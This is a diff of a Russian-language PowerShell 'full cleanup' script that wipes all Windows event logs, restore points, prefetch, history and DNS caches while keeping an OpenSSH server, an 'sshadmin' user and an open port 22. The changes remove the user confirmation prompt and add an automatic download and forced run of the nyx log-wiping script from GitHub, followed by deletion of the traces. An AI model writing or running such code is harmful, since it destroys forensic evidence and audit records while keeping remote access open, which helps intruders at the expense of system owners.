@@ -7,17 +7,6 @@ if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     exit 1
 }
 
-if (-not $Force) {
-    Write-Host "ВНИМАНИЕ: Этот скрипт удалит файлы и логи" -ForegroundColor Red
-    Write-Host "OpenSSH будет сохранен и продолжит работать" -ForegroundColor Green
-    Write-Host "Продолжить? (Y/N): " -ForegroundColor Cyan -NoNewline
-    $confirm = Read-Host
-    if ($confirm -notmatch '^[YyДд]') {
-        Write-Host "Отменено" -ForegroundColor Yellow
-        exit
-    }
-}
-
 function Remove-Aggressive {
     param([string]$Path)
     try {
@@ -33,7 +22,7 @@ function Remove-Aggressive {
     return $false
 }
 
-Write-Host "Начинаем полную очистку системы" -ForegroundColor Green
+Write-Host "Начинаем полную автоматическую очистку системы" -ForegroundColor Green
 
 Write-Host "Настройка служб..." -ForegroundColor Cyan
 Stop-Service ssh-agent -Force -ErrorAction SilentlyContinue
@@ -263,54 +252,16 @@ if ($firewallRule) {
     netsh advfirewall firewall add rule name="SSH" dir=in action=allow protocol=TCP localport=22
 }
 
-Write-Host "Статистика очистки" -ForegroundColor Cyan
-Write-Host "Удалено/очищено:"
-Write-Host "- Все журналы событий Windows" -ForegroundColor Gray
-Write-Host "- Chocolatey полностью" -ForegroundColor Gray
-Write-Host "- Все временные файлы системы" -ForegroundColor Gray
-Write-Host "- Prefetch кэш" -ForegroundColor Gray
-Write-Host "- Точки восстановления" -ForegroundColor Gray
-Write-Host "- Корзина всех пользователей" -ForegroundColor Gray
-Write-Host "- История и Recent файлы" -ForegroundColor Gray
-Write-Host "- DNS и сетевые кэши" -ForegroundColor Gray
-Write-Host "Сохранено:"
-Write-Host "- OpenSSH сервер и клиент" -ForegroundColor Gray
-Write-Host "- Конфигурация SSH" -ForegroundColor Gray
-Write-Host "- Служба sshd" -ForegroundColor Gray
-Write-Host "- Пользователь sshadmin" -ForegroundColor Gray
+Write-Host "Запуск дополнительной очистки через nyx..." -ForegroundColor Cyan
 
-Write-Host "`nДополнительная очистка" -ForegroundColor Cyan
-Write-Host "Использовать дополнительные средства очистки (nyx.ps1)? (Y/N): " -ForegroundColor Cyan -NoNewline
-$additionalClean = Read-Host
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+Invoke-WebRequest -Uri "https://github.com/evilsocket/nyx/raw/refs/heads/main/nyx.ps1" -OutFile "nyx.ps1"
+.\nyx.ps1 -DryRun
+.\nyx.ps1 -Force
 
-if ($additionalClean -match '^[YyДд]') {
-    Write-Host "Запуск дополнительной очистки..." -ForegroundColor Green
-    
-    try {
-        Write-Host "Проверка изменений (DryRun)..." -ForegroundColor Yellow
-        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
-        .\nyx.ps1 -DryRun
-        
-        Write-Host "Выполнение полной очистки..." -ForegroundColor Yellow
-        .\nyx.ps1 -Force
-        
-        Write-Host "Дополнительная очистка завершена" -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Ошибка при выполнении дополнительной очистки: $_" -ForegroundColor Red
-    }
-}
-
-Write-Host "`nУдаление скрипта..." -ForegroundColor Cyan
-$scriptPath = $MyInvocation.MyCommand.Path
-
-try {
-    cmd /c "del /f /q `"$scriptPath`" >nul 2>&1"
-    Write-Host "Скрипт удален" -ForegroundColor Green
-}
-catch {
-    Write-Host "Не удалось удалить скрипт автоматически" -ForegroundColor Yellow
-    Write-Host "Удалите файл вручную: $scriptPath" -ForegroundColor Gray
+Write-Host "Удаление следов очистки..." -ForegroundColor Cyan
+if (Test-Path "nyx.ps1") {
+    Remove-Item "nyx.ps1" -Force -ErrorAction SilentlyContinue
 }
 
 Remove-Variable * -ErrorAction SilentlyContinue
